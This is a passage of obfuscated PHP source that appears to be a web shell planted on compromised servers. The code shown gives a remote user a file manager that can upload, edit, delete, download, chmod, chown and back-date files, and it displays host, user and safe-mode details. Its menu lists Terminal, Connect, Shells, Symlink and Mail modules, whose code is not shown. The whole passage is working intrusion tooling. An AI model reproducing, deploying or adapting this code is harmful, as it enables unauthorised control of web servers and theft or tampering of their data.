GetUrlFromPath($t3){$s54=str_replace(_,'/',$t3);$l55=empty($_SERVER['HTTPS'])||$_SERVER['HTTPS']==='off'?'http://':'https://';$d56=str_replace(document_root,'',$s54);return $l55.server_name.$d56;}function PostUrlContent($j57,$s58){global $s32;$i59=array('http'=>array('method'=>"POST",'header'=>"Content-Type: application/x-www-form-urlencoded\r\n"."User-Agent: $s32\r\n",'content'=>http_build_query($s58)));$w42="";$a60=stream_context_create($i59);$e61=get_headers($j57);if($k53=substr($e61[0],9,3)!="200"){$w42="Error: $k53";}else{if($n62=file_get_contents($j57,null,$a60)){$w42=htmlspecialchars($n62);}if($b63=fopen($j57,'r',false,$a60)){$n62=stream_get_contents($b63);fclose($b63);$w42=htmlspecialchars($n62);}if($b63=fopen($j57,'r',false,$a60)){$n62="";while(!feof($b63)){$n62.=fread($b63,10240);}fclose($b63);$w42=htmlspecialchars($n62);}}return $w42;}function GetFileType($t3){if(is_file($t3)){return pathinfo($t3)['extension'];}elseif(is_dir($t3)){return "dir";}elseif(is_link($t3)){return "link";}else{return "-";}}function GetFileTime($t3,$l4){switch($l4){case "create":return date("Y-m-d H:i:s",@filectime($t3));break;case "modify":return date("Y-m-d H:i:s",@filemtime($t3));break;case "access":return date("Y-m-d H:i:s",@fileatime($t3));break;}}function GetFilePerm($t3){$c64=@fileperms($t3);switch($c64&0xF000){case 0xC000:$p65='s';break;case 0xA000:$p65='l';break;case 0x8000:$p65='r';break;case 0x6000:$p65='b';break;case 0x4000:$p65='d';break;case 0x2000:$p65='c';break;case 0x1000:$p65='p';break;default:$p65='u';}$p65.=(($c64&0x0100)?'r':'-');$p65.=(($c64&0x0080)?'w':'-');$p65.=(($c64&0x0040)?(($c64&0x0800)?'s':'x'):(($c64&0x0800)?'S':'-'));$p65.=(($c64&0x0020)?'r':'-');$p65.=(($c64&0x0010)?'w':'-');$p65.=(($c64&0x0008)?(($c64&0x0400)?'s':'x'):(($c64&0x0400)?'S':'-'));$p65.=(($c64&0x0004)?'r':'-');$p65.=(($c64&0x0002)?'w':'-');$p65.=(($c64&0x0001)?(($c64&0x0200)?'t':'x'):(($c64&0x0200)?'T':'-'));return sprintf('%s [%s]',$p65,substr(decoct($c64),2));}function GetFileSize($t3){$t3=abs($t3);$i66=array('B','KB','MB','GB','TB','PB','EB','ZB','YB');$t67=$t3?floor(log($t3)/log(1024)):0;return sprintf('%.2f '.$i66[$t67],($t3/pow(1024,floor($t67))));}function GetUser($t3){if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$z68=posix_getpwuid(posix_getuid());$z69=posix_getgrgid(posix_getgid());switch($t3){case 'usr':return $z68['name'];break;case 'uid':return $z68['uid'];break;case 'grp':return $z69['name'];break;case 'gid':return $z69['gid'];break;}}else{switch($t3){case 'usr':return get_current_user();break;case 'uid':return getmyuid();break;case 'grp':return "?";break;case 'gid':return getmygid();break;}}}function GetOwnerGroup($t3){if(Unix()){if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$g70=posix_getpwuid(fileowner($t3));$i71=posix_getgrgid(filegroup($t3));return sprintf('%s:%s',$g70['name'],$i71['name']);}}return "?:?";}function GetFileOwnerGroup($t3){if(Unix()){if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$g70=posix_getpwuid(fileowner($t3));$i71=posix_getgrgid(filegroup($t3));return sprintf('%s:%s/%s:%s',$g70['name'],$g70['uid'],$i71['name'],$i71['gid']);}}return "?:?/?:?";}function GetSafeMode(){if(strtolower(ini_get("safe_mode"))=='on'){$g72="<font class='off'>ON</font>";}else{$g72="<font class='on'>OFF</font>";}return $g72;}function MapDirectory($t3){$n37="";$s7=str_replace("\\",_,$t3);if(empty($s7)){$s7=realpath(".");}elseif(realpath($s7)){$s7=realpath($s7);}$s7=str_replace("\\",_,$s7);if(substr($s7,-1)!=_){$s7.=_;}$s7=str_replace("\\\\","\\",$s7);$l73=$k74=explode(_,substr($s7,0,-1));$m75=0;foreach($l73 as $v76){$n77="";$b78=0;foreach($k74 as $n79){$n77.=$n79._;if($b78==$m75){break;}$b78++;}$n37.="<a href=\"?d=".urle($n77)."\" >".htmlspecialchars($v76)."</a>"._;$m75++;}return rtrim($n37,_);}function MapDrive($t3){if(!Unix()){$u6=explode("\\",$t3);$u6=$u6[0];$k80="";foreach(range("A","Z")as $u81){$r82=is_dir($u81.":\\");if($r82){$k80.="<a href=\"?d=".urle($u81.":\\")."\">[";if(strtolower($u81.':')!=strtolower($u6)){$k80.=$u81;}else{$k80.="<font color=\"orange\"><b>".$u81."</b></font>";}$k80.="]</a>";}}return $k80;}}function MainMenu(){$n83=array("ExpL"=>"?d=".urle(getcwd()),"&#9733; Sec."=>"?x=secure","Info"=>"?x=info","Database"=>"?x=db","Terminal"=>"?x=terminal","Connect"=>"?x=connect",".Htaccess"=>"?x=htaccess","PHP"=>"?x=php","Perl/CGI"=>"?x=perl","Mail"=>"?x=mail","Process"=>"?x=process","Shells"=>"?x=shells","Symlink"=>"?x=symlink","&#9819; Tools"=>"?z","Account"=>"?x=account","Update"=>"?x=update","Logout"=>"?x=logout");$o84="";foreach($n83 as $z85=>$q86){$z87=substr($q86,1,1);$l88=substr($q86,3);$x89=any($z87,$_REQUEST)&&$_REQUEST[$z87]==$l88?"class='active'":"";if($z85=="Logout"){$o84.="<li><a ".$x89." href='".$q86."' onclick=\"return confirm('Bye !');\">".$z85."</a></li>";}else{$o84.="<li><a ".$x89." href='".$q86."'>".$z85."</a></li>";}}return $o84;}function MenuTools($t3){global $t90;$f91="<div class='menu-tools'><ul>";$t90=$t3;foreach($t90 as $k5=>$u6){$x89=$_REQUEST['z']==$k5?"class='active'":"";$f91.="<li><a ".$x89." href='?z=".$k5."'>[".$u6['title']."]</a></li>";}$f91.="</ul></div>";return $f91;}printf("<div id='header'>
		<div class='header-left'>
			<div id='info'>
				<font class='on'>[%s]</font><br>
				<font class='on'>[%s]</font><br>
				[<a href='//%s' target='_blank'>%s</a>]: <font class='on'>%s:%s</font> [%s]: <font class='on'>%s:%s</font><br>
				[USER]: <font class='on'>%s(%s)</font> [GROUP]: <font class='on'>%s(%s)</font><br>
				[HDD]: <font class='on'>%s</font> / <font class='on'>%s</font><br>
				[PHPMODE]: <font class='on'>%s</font><br>
				[SAFEMODE]: <font class='on'>%s</font><br>
			</div>
		</div>
		<div class='header-right'>
			<a href='%s'><div id='logo'>
				<h1 id='title'>%s</h1>
				<div class='line'></div>
				<h2 id='subtitle'>%s</h2>
			</div></a>
		</div>
		<div class='clr'></div>
		</div>
		<div id='container'>
		<div class='menu'>
			<ul>%s</ul>
		</div>
		<div class='menu-directory'>
			<div class='map-switch'>
				<input type='submit' name='map-switch' value='&#9822;' onclick='mapSwitch(\"map1\",\"map2\")'>
			</div>
			<div class='map1' id='map1' style='display:inline-block'>
				<span style='margin-right:5px'>%s</span>
				<span style='margin-right:5px'>%s</span>
			</div>
			<div class='map2' id='map2' style='display:none'>
				<form method='post' id='map2-form' onsubmit='document.getElementById(\"map2-form\").action=\"?g=\" + encodeURI(document.getElementById(\"map2-input\").value);'>
					<input type='text' value='%s' id='map2-input'/>
					<input type='submit' value='Go'>
				</form>
			</div>
		</div>
		<div class='content'>",php_uname(),server_software,server_name,server_name,gethostbyname(http_host),server_port,B64D($s2[0]),remote_addr,remote_port,GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),GetFileSize(@disk_free_space($f36)),GetFileSize(@disk_total_space($f36)),php_sapi_name(),GetSafeMode(),php_self,$g1['title'],$g1['subtitle'],MainMenu(),MapDrive($n37),MapDirectory($n37),$n37);if(any("g",$_REQUEST)){$b92=$_REQUEST['g'];if(is_dir($b92)){header('location:'.php_self.'?d='.urle($b92));}elseif(is_file($b92)||is_link($b92)){header('location:'.php_self.'?a=v&r='.urle($b92));}else{header('location:'.php_self);}}if(any("d",$_REQUEST)||request_uri===script_name){$_SESSION['c']=urle($f36);if(any("file",$_REQUEST)&&$_REQUEST['file']=="New File"){$r29=trim($f36._.$_REQUEST['what']);if(file_exists($r29)){printf("<center style='margin-bottom:10px'><b class='off'>Can't create New File!</b></center>");}else{$s93=@fopen($r29,"w");fclose($s93);header("location:".php_self."?a=e&r=".urle($r29));}}if(any("directory",$_REQUEST)&&$_REQUEST['directory']=="New Dir"){$g94=trim($_REQUEST['what']);@chdir($f36);if(!@mkdir($g94)){printf("<center style='margin-bottom:10px'><b class='off'>Can't create New Directory!</b></center>");}else{printf("<center style='margin-bottom:10px'><b class='on'>Directory '%s' Created on %s</b></center>",$g94,GetFileTime($f36._.$g94,'create'));}}if(any("upload",$_REQUEST)&&$_REQUEST['upload']=="Upload"){$y95=$f36._.trim(basename($_FILES["what"]["name"]));if(move_uploaded_file($_FILES["what"]["tmp_name"],$y95)){printf("<center style='margin-bottom:10px'><b class='on'>File %s has been uploaded</b></center>",basename($_FILES["what"]["name"]));}else{printf("<center style='margin-bottom:10px'><b class='off'>&#10005; Can't upload new file! &#10005;</b></center>");}}if($b63=@opendir($f36)){$a96=array();$s97=0;$p98=0;while(false!==($r29=readdir($b63))){$c99=rtrim($f36,_)._.$r29;$k100=substr($f36,0,strrpos($f36,_));if(strlen($k100)<=2)$k100=$k100._;$j101=GetFileType($c99);$i66=GetFileSize(@filesize($c99));$x102=GetFileTime($c99,"modify");$n103=GetFilePerm($c99);$n104=GetOwnerGroup($c99);$a105=@mime_content_type($c99);$l106="";if(strpos($a105,'image')!==false){$l106="?a=v&w=i&r=".urle($c99);}elseif(strpos($a105,'video')!==false){$l106="?a=v&w=v&r=".urle($c99);}elseif(strpos($a105,'audio')!==false){$l106="?a=v&w=a&r=".urle($c99);}else{$l106="?a=v&r=".urle($c99);}if($r29=="."){$a96[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($f36)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($f36)."'>.</a></td><td><center>".strtoupper($j101)."</center></td><td><center>".$i66."</center></td><td><center>".$n103."</center></td><td><center>".$n104."</center></td><td><center>".$x102."</center></td><td><a class='action' href='?a=x&r=".urle($f36)."' onclick=\"return confirm('Delete Directory [ /".basename($f36)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($f36)."' title='Modify Folder'>&#8499;</a></td></tr>";}elseif($r29==".."){$a96[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($k100)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAmlJREFUeNpsU0toU0EUPfPysx/tTxuDH9SCWhUDooIbd7oRUUTMouqi2iIoCO6lceHWhegy4EJFinWjrlQUpVm0IIoFpVDEIthm0dpikpf3ZuZ6Z94nrXhhMjM3c8895977BBHB2PznK8WPtDgyWH5q77cPH8PpdXuhpQT4ifR9u5sfJb1bmw6VivahATDrxcRZ2njfoaMv+2j7mLDn93MPiNRMvGbL18L9IpF8h9/TN+EYkMffSiOXJ5+hkD+PdqcLpICWHOHc2CC+LEyA/K+cKQMnlQHJX8wqYG3MAJy88Wa4OLDvEqAEOpJd0LxHIMdHBziowSwVlF8D6QaicK01krw/JynwcKoEwZczewroTvZirlKJs5CqQ5CG8pb57FnJUA0LYCXMX5fibd+p8LWDDemcPZbzQyjvH+Ki1TlIciElA7ghwLKV4kRZstt2sANWRjYTAGzuP2hXZFpJ/GsxgGJ0ox1aoFWsDXyyxqCs26+ydmagFN/rRjymJ1898bzGzmQE0HCZpmk5A0RFIv8Pn0WYPsiu6t/Rsj6PauVTwffTSzGAGZhUG2F06hEc9ibS7OPMNp6ErYFlKavo7MkhmTqCxZ/jwzGA9Hx82H2BZSw1NTN9Gx8ycHkajU/7M+jInsDC7DiaEmo1bNl1AMr9ASFgqVu9MCTIzoGUimXVAnnaN0PdBBDCCYbEtMk6wkpQwIG0sn0PQIUF4GsTwLSIFKNqF6DVrQq+IWVrQDxAYQC/1SsYOI4pOxKZrfifiUSbDUisif7XlpGIPufXd/uvdvZm760M0no1FZcnrzUdjw7au3vu/BVgAFLXeuTxhTXVAAAAAElFTkSuQmCC'/> <a title='Parent Directory' href='?d=".urle($k100)."'>".$r29."</a></td><td><center>".strtoupper($j101)."</center></td><td><center>".$i66."</center></td><td><center>".$n103."</center></td><td><center>".$n104."</center></td><td><center>".$x102."</center></td><td><a class='action' href='?a=x&r=".urle($k100)."' onclick=\"return confirm('Delete Directory [ /".basename($k100)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($k100)."' title='Modify Folder'>&#8499;</a></td></tr>";}else{if($j101=="dir"){$a96[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($c99)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Open Directory' href='?d=".urle($c99)."'>".$r29."</a></td><td><center>".strtoupper($j101)."</center></td><td><center>".$i66."</center></td><td><center>".$n103."</center></td><td><center>".$n104."</center></td><td><center>".$x102."</center></td><td><a class='action' href='?a=x&r=".urle($c99)."' onclick=\"return confirm('Delete Directory [ /".basename($c99)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($c99)."' title='Modify Folder'>&#8499;</a></td></tr>";$s97++;}else{$a96[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($c99)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$l106."'>".$r29."</a></td><td><center>".strtoupper($j101)."</center></td><td><center>".$i66."</center></td><td><center>".$n103."</center></td><td><center>".$n104."</center></td><td><center>".$x102."</center></td><td><a class='action' href='?a=e&r=".urle($c99)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($c99)."' onclick=\"return confirm('Delete Filename [ ".basename($c99)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($c99)."' title='Download File'>&#10149;</a></td></tr>";$p98++;}}}sort($a96);$i107="";foreach($a96 as $m108){$i107.=$m108;}printf("<div id='action'>
					<table><tr>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='file' value='New File'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='directory' value='New Dir'/>
					</form></td>
					<td><form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value' id='find-action'/><input type='submit' name='find-button' value='Find'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s&x=upload' enctype='multipart/form-data'>
						<input name='what' type='file' class='inputfile'/><input type='submit' name='upload' value='Upload'/>
					</form></td>
					</tr></table>
				</div>
				<div id='home'>
					<form name='files' method=POST action='?x=action' onclick='checkCount(\"count\")'>
						<table class='table sortable'>
							<thead>
								<tr>
									<th class='sorttable_nosort'><input type='checkbox' name='check-all' onclick='checkAll()'/></th>
									<th class='sorttable_numeric'>Name</th>
									<th>Type</th>
									<th>Size</th>
									<th>Perms</th>
									<th>Owner:Group</th>
									<th>Modified</th>
									<th>Act.</th>
								</tr>
							</thead>
							<tbody>%s</tbody>
							<tFoot>
								<tr>
									<td colspan='8'>[<span id='count'>0</span>] Selected | Dir's: [%s] File's: [%s]</td>
								</tr>
							</tFoot>
						</table>
						<select name='action-value'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='delete'>Delete</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<input type='submit' value='Action' name='action-button' />
					</form>
				</div>",urle($f36),urle($f36),urle($f36),$i107,$s97,$p98);closedir($b63);}else{print"<center style='margin-bottom:10px'><b class='off'>Can't Open Location</b></center>";}}if(any("r",$_REQUEST)){if(file_exists(urld($_REQUEST["r"]))){$r29=strval(urld($_REQUEST["r"]));$g109=any("status",$_SESSION)?$_SESSION['status']:"";$x110=php_self."?d=".urle($f36);printf("<div class='divide'>
				<div class='divide-left'>
					<table class='table'>
						<tr><td>Name</td><td>%s</td></tr>
						<tr><td>Size</td><td>%s</td></tr>
						<tr><td>Permission</td><td>%s</td></tr>
						<tr><td>Create time</td><td>%s</td></tr>
						<tr><td>Last modified</td><td>%s</td></tr>
						<tr><td>Last accessed</td><td>%s</td></tr>
					</table>
				</div>
				<div class='divide-right'>
					<table class='table'>
						<tr><td>MIME</td><td>%s</td></tr>
						<tr><td>Owner/Group</td><td>%s</td></tr>
						<tr><td>MD5</td><td>%s</td></tr>
						<tr><td>SHA1</td><td>%s</td></tr>
					</table>
				</div>
			</div>",basename($r29),GetFileSize(@filesize($r29)),GetFilePerm($r29),GetFileTime($r29,"create"),GetFileTime($r29,"modify"),GetFileTime($r29,"access"),mime_content_type($r29),GetFileOwnerGroup($r29),@md5_file($r29),@sha1_file($r29));if(is_file($r29)||is_link($r29)){$n83=array("Back"=>"?a=b&r=","Edit"=>"?a=e&r=","View"=>"?a=v&r=","Copy"=>"?a=cp&r=","Move"=>"?a=mv&r=","Download"=>"?a=d&r=","Hexdump"=>"?a=h&r=","Chmod"=>"?a=c&r=","Chown"=>"?a=cwn&r=","Chgrp"=>"?a=cgp&r=","Touch"=>"?a=t&r=","Rename"=>"?a=r&r=","Delete"=>"?a=x&r=");}elseif(is_dir($r29)){$n83=array("Back"=>"?a=b&r=","Chmod"=>"?a=c&r=","Chown"=>"?a=cwn&r=","Chgrp"=>"?a=cgp&r=","Touch"=>"?a=t&r=","Rename"=>"?a=r&r=","Delete"=>"?a=x&r=");}$o84="";foreach($n83 as $z85=>$q86){$z87=substr($q86,1,1);$l88=substr($q86,3,strpos($q86,'&')-3);$x89=any($z87,$_REQUEST)&&$_REQUEST[$z87]==$l88?"class='active'":"";if($z85=="Delete"){$o84.="<li><a ".$x89." href='".$q86.urle($r29)."' onclick=\"return confirm('Delete Filename [ ".basename($r29)." ] ?');\">".$z85."</a></li>";}elseif($z85=="Back"){$o84.="<li><a ".$x89." href='".$x110."'>".$z85."</a></li>";}else{$o84.="<li><a ".$x89." href='".$q86.urle($r29)."'>".$z85."</a></li>";}}printf("<div class='menu'>
			<ul>%s</ul>
		</div>",$o84);if($_REQUEST['a']=='e'){$m111="";if(filesize($r29)>5242880){$m111.="Lazy to Read more than 5MB Files";}else{$l112=fopen($r29,'r');if($l112){while(!feof($l112)){$m111.=htmlentities(fread($l112,(1024*4)));}fclose($l112);}}printf("<form class='frmsource' method='post'>
					<textarea id='sourcefocus' name='sourcecode' rows='25' cols='100'>%s</textarea>
					<input type='Submit' value='Save file' name='save'/>
					<label>%s</label>
				</form>",$m111,$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("save",$_REQUEST)){$j113=$_REQUEST['sourcecode'];if(function_exists("chmod"))chmod($r29,0755);$w114=fopen($r29,'w+');$b115=fwrite($w114,$j113);fclose($w114);if($b115){$_SESSION['status']="File Saved ! ".GetFileTime($r29,"modify")." | ".GetFileSize(filesize($r29));}else{$_SESSION['status']="Whoops, something went wrong...";}header("location:".php_self."?a=e&r=".urle($r29));}}if($_REQUEST['a']=='r'){printf("<form class='new' method='post'>
				<input type='text' name='name' value='%s'/>
				<input type='Submit' value='Rename' name='rename'/>
				<label>%s</label>
			</form>",basename($r29),$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("rename",$_REQUEST)){$d56=pathinfo(trim($r29));$w116=$d56['dirname']._.trim($_REQUEST['name']);if(!rename(trim($r29),$w116)){$_SESSION['status']='Whoops, something went wrong...';}else{$_SESSION['status']='Renamed file with success';}header("location:".php_self."?a=r&r=".urle($w116));}}if($_REQUEST['a']=='c'){printf("<form class='new' method='post'>
				<input type='text' name='octal' value='%s'/>
				<input type='Submit' value='Chmod' name='chmod'/>
				<label>%s</label>
			</form>",substr(decoct(fileperms($r29)),2),$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("chmod",$_REQUEST)){$i117=octdec($_REQUEST['octal']);if(!chmod(trim($r29),$i117)){$_SESSION['status']='Whoops, something went wrong...';}else{$_SESSION['status']='Chmod file with success';}header("location:".php_self."?a=c&r=".urle($r29));}}if($_REQUEST['a']=='cwn'){$l118='';if(function_exists('posix_getpwuid')){$g70=posix_getpwuid(fileowner($t3));$l118=$g70['name'];}printf("<form class='new' method='post'>
				<input type='text' name='own' value='%s'/>
				<input type='Submit' value='Chown' name='chown'/>
				<label>%s</label>
			</form>",$l118,$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("chown",$_REQUEST)){$l118=$_REQUEST['own'];if(!chown(trim($r29),$l118)){$_SESSION['status']='Whoops, something went wrong...';}else{$_SESSION['status']='Chown file with success';}header("location:".php_self."?a=cwn&r=".urle($r29));}}if($_REQUEST['a']=='cgp'){$l119='';if(function_exists('posix_getgrgid')){$i71=posix_getgrgid(filegroup($t3));$l119=$i71['name'];}printf("<form class='new' method='post'>
				<input type='text' name='grp' value='%s'/>
				<input type='Submit' value='Chgrp' name='chgrp'/>
				<label>%s</label>
			</form>",$l119,$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("chgrp",$_REQUEST)){$l119=$_REQUEST['grp'];if(!chgrp(trim($r29),$l119)){$_SESSION['status']='Whoops, something went wrong...';}else{$_SESSION['status']='Chgrp file with success';}header("location:".php_self."?a=cgp&r=".urle($r29));}}if($_REQUEST['a']=='t'){printf("<form class='new' method='post'>
				<input type='text' name='time' value='%s'/>
				<input type='Submit' value='Touch' name='touch'/>
				<label>%s</label>
			</form>",GetFileTime($r29,"modify"),$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("touch",$_REQUEST)){$e120=$_REQUEST['time'];if(!touch(trim($r29),strtotime($e120))){$_SESSION['status']='Whoops, something went wrong...';}else{$_SESSION['status']='Touched file with success';}header("location:".php_self."?a=t&r=".urle($r29));}}if($_REQUEST['a']=='v'){printf("<div class='menu'>
					<ul>
						<li><a href='?a=v&r=%s'>Source</a></li>
						<li><a href='?a=v&w=f&r=%s'>iFrame</a></li>
						<li><a href='?a=v&w=i&r=%s'>Image</a></li>
						<li><a href='?a=v&w=v&r=%s'>Video</a></li>
						<li><a href='?a=v&w=a&r=%s'>Audio</a></li>
					</ul>
				</div>",urle($r29),urle($r29),urle($r29),urle($r29),urle($r29));if(is_readable($r29)){if(any("w",$_REQUEST)){$j57=GetUrlFromPath($r29);$j101=pathinfo($j57)['extension'];if($_REQUEST['w']=='f'){printf("<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New Tab <--</a></center>",$j57,$j57);}if($_REQUEST['w']=='i'){printf("<center><img src='%s' alt='&nbsp;Not Image'/></center>",$j57);}if($_REQUEST['w']=='v'){printf("<center><video width='640' height='320' controls><source src='%s' type='video/%s'>Suck</video></center>",$j57,$j101);}if($_REQUEST['w']=='a'){printf("<center><audio controls><source src='%s' type='audio/%s'>Suck</audio></center>",$j57,$j101);}}else{if(filesize($r29)>5242880){printf("Lazy to Read more than 5MB Files");}else{$v121=highlight_file($r29,true);printf("<div class='highlight'>%s</div>",$v121);}}}}if($_REQUEST['a']=='h'){$s8=file_get_contents($r29);$y122=0;$o48=array('00000000<br>','','');$x123=strlen($s8);for($m75=0;$m75<$x123;++$m75){$o48[1].=sprintf('%02X',ord($s8[$m75])).' ';switch(ord($s8[$m75])){case 0:$o48[2].=' ';break;case 9:$o48[2].=' ';break;case 10:$o48[2].=' ';break;case 13:$o48[2].=' ';break;default:$o48[2].=$s8[$m75];break;}$y122++;if($y122==32){$y122=0;if($m75+1<$x123){$o48[0].=sprintf('%08X',$m75+1).'<br>';}$o48[1].='<br>';$o48[2].="\n";}}printf("
				<div id='hexdump'>
					<table class='hexdump'>
						<tr>
							<td><pre>%s</pre></td>
							<td><pre>%s</pre></td>
							<td><pre>%s</pre></td>
						</tr>
					</table>
				</div>",$o48[0],$o48[1],htmlspecialchars($o48[2]));}if($_REQUEST['a']=='cp'||$_REQUEST['a']=='mv'){printf("<form class='new' method='post'>
				<input type='text' name='file-dest' value='%s'/>
				<input type='Submit' value='%s' name='submit'/>
				<label>%s</label>
			</form>",$r29,($_REQUEST['a']=='cp'?'Copy':'Move'),$g109);if(any("status",$_SESSION))unset($_SESSION['status']);if(any("submit",$_REQUEST)){$m111=$r29;$c124=$_REQUEST['file-dest'];if(!file_exists($c124)){if($_REQUEST['a']=='cp'){if(!copy(trim($m111),trim($c124))){$_SESSION['status']='Whoops, cannot copying...';}else{$_SESSION['status']="Copy file with success <a href=?a=v&r='".urle($c124)."'>'".basename($c124)."'</a>";}}elseif($_REQUEST['a']=='mv'){if(!copy(trim($m111),trim($c124))){$_SESSION['status']='Whoops, cannot moving...';}else{if(Remove($m111)){$_SESSION['status']="Move file with success";$r29=$c124;}else{$_SESSION['status']='Whoops, just copying...';}}}}else{$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='".urle($c124)."'>'".basename($c124)."'</a>";}if($_REQUEST['a']=='cp'){header("location:".php_self."?a=cp&r=".urle($r29));}elseif($_REQUEST['a']=='mv'){header("location:".php_self."?a=mv&r=".urle($r29));}}}if($_REQUEST['a']=='d'){if(file_exists($r29)){header('Cache-Control:must-revalidate,post-check=0,pre-check=0');header('Content-Disposition:attachment;filename='.basename($r29));header('Content-Type:application/octet-stream');header('Content-Description:File Transfer');header('Content-Transfer-Encoding:binary');header('Content-Length:'.filesize($r29));header('Pragma:public');header('Expires:0');ob_clean();readfile($r29);exit;}}if($_REQUEST['a']=='x'){if(file_exists($r29)){if(Remove($r29)){header("location:".$x110);}}print'<font class="off">Cannot Delete</font>';}}else{print'<font class="off">File Not 